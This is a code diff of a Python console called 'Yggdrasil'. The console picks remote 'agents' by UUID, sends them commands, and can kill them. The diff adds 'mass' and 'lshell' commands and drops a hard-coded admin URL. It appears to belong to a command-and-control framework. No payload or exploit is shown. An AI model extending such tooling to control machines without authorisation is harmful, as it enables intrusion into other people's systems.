@@ -10,9 +10,6 @@ GREEN = "\033[1;92m"
 CYAN = "\033[1;36m"
 RESET = "\033[0m"
 
-
-url = f"http://127.0.0.1:8000/admin" # change later to proper port/ip/domain name
-
 script_dir = os.path.dirname(os.path.abspath(__file__))
 profile_path = os.path.join(script_dir, '..', 'Agent_Profiles')
 
@@ -26,6 +23,8 @@ server_command = {
     "help": help,
     "uuid2name": uuid2name,
     "name2uuid": name2uuid,
+    "mass": mass,
+    "lshell": lshell,
 }
 
 
@@ -64,9 +63,6 @@ print("========================== Select an Agent ==========================\n")
 # A forever loop to accept client connections
 try:
     while True:
-        # if not os.getenv('UUID') or not os.getenv('PROFILE'):
-        #     agents()
-        
         message_to_send = input(f"{GREEN}Yggdrasil > {RESET}")
         if not message_to_send.strip():
             continue
@@ -82,7 +78,7 @@ try:
             cmd(cmd_args)
             continue
 
-        if not os.getenv('UUID'):
+        if not os.getenv('UUID') or not os.getenv('PROFILE'):
             agents()
             continue
         
@@ -92,10 +88,10 @@ try:
         commands = config['commands']
 
         if cmd_input in commands:
-            send_cmd(url, message_to_send) # if it's an agent side function, send it immediately.
+            send_cmd(message_to_send) # if it's an agent side function, send it immediately.
             
             if message_to_send == "exit": # exit will delete the agent uuid from redis
-                print(f"\n========== Killing {os.getenv('UUID')} ==========")
+                print(f"{CYAN}Killing UUID: {RESET}{os.getenv('UUID')}")
                 del os.environ['UUID']
                 continue
 
